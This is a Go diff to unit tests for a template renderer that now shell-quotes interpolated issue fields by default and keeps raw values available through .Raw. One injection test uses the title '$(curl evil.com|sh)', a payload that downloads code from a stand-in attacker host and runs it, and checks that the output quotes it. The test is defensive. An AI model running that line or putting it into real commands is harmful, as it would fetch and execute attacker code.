@@ -19,7 +19,7 @@ func TestRender_LegacyPlaceholder(t *testing.T) {
 	}
 }
 
-func TestRender_GoTemplate(t *testing.T) {
+func TestRender_GoTemplate_ShellQuotedByDefault(t *testing.T) {
 	t.Parallel()
 	data := IssueData{
 		Identifier: "AIS-123",
@@ -27,11 +27,59 @@ func TestRender_GoTemplate(t *testing.T) {
 		State:      "In Progress",
 		Priority:   "High",
 	}
-	got, err := Render("Work on {{.Identifier}}: {{.Title}} ({{.State}}, {{.Priority}})", data)
+	got, err := Render("cmd {{.Identifier}} {{.Title}} {{.State}} {{.Priority}}", data)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	want := "Work on AIS-123: Fix login bug (In Progress, High)"
+	want := "cmd 'AIS-123' 'Fix login bug' 'In Progress' 'High'"
+	if got != want {
+		t.Errorf("got %q, want %q", got, want)
+	}
+}
+
+func TestRender_GoTemplate_RawAccess(t *testing.T) {
+	t.Parallel()
+	data := IssueData{
+		Identifier: "AIS-123",
+		Title:      "Fix login bug",
+	}
+	got, err := Render("{{.Raw.Identifier}}: {{.Raw.Title}}", data)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	want := "AIS-123: Fix login bug"
+	if got != want {
+		t.Errorf("got %q, want %q", got, want)
+	}
+}
+
+func TestRender_GoTemplate_ShellInjectionPrevented(t *testing.T) {
+	t.Parallel()
+	data := IssueData{
+		Identifier: "AIS-123",
+		Title:      "$(curl evil.com|sh)",
+	}
+	got, err := Render("cmd {{.Title}}", data)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	want := "cmd '$(curl evil.com|sh)'"
+	if got != want {
+		t.Errorf("got %q, want %q", got, want)
+	}
+}
+
+func TestRender_GoTemplate_SingleQuoteEscaped(t *testing.T) {
+	t.Parallel()
+	data := IssueData{
+		Identifier: "AIS-123",
+		Title:      "it's a bug",
+	}
+	got, err := Render("cmd {{.Title}}", data)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	want := `cmd 'it'\''s a bug'`
 	if got != want {
 		t.Errorf("got %q, want %q", got, want)
 	}
@@ -44,12 +92,12 @@ func TestRender_GoTemplateConditional(t *testing.T) {
 		Title:       "Fix login bug",
 		Description: "Users can't log in",
 	}
-	tmpl := `{{.Identifier}}: {{.Title}}{{if .Description}} - {{.Description}}{{end}}`
+	tmpl := `{{.Identifier}} {{.Title}}{{if .Raw.Description}} {{.Description}}{{end}}`
 	got, err := Render(tmpl, data)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	want := "AIS-123: Fix login bug - Users can't log in"
+	want := "'AIS-123' 'Fix login bug' 'Users can'\\''t log in'"
 	if got != want {
 		t.Errorf("got %q, want %q", got, want)
 	}
@@ -61,12 +109,12 @@ func TestRender_GoTemplateNoDescription(t *testing.T) {
 		Identifier: "AIS-123",
 		Title:      "Fix login bug",
 	}
-	tmpl := `{{.Identifier}}: {{.Title}}{{if .Description}} - {{.Description}}{{end}}`
+	tmpl := `{{.Identifier}} {{.Title}}{{if .Raw.Description}} {{.Description}}{{end}}`
 	got, err := Render(tmpl, data)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	want := "AIS-123: Fix login bug"
+	want := "'AIS-123' 'Fix login bug'"
 	if got != want {
 		t.Errorf("got %q, want %q", got, want)
 	}
@@ -79,12 +127,12 @@ func TestRender_GoTemplateLabels(t *testing.T) {
 		Title:      "Fix bug",
 		Labels:     []string{"bug", "frontend"},
 	}
-	tmpl := `{{.Identifier}}{{range .Labels}} [{{.}}]{{end}}`
+	tmpl := `{{.Identifier}} {{.Labels}}`
 	got, err := Render(tmpl, data)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	want := "AIS-123 [bug] [frontend]"
+	want := "'AIS-123' 'bug,frontend'"
 	if got != want {
 		t.Errorf("got %q, want %q", got, want)
 	}
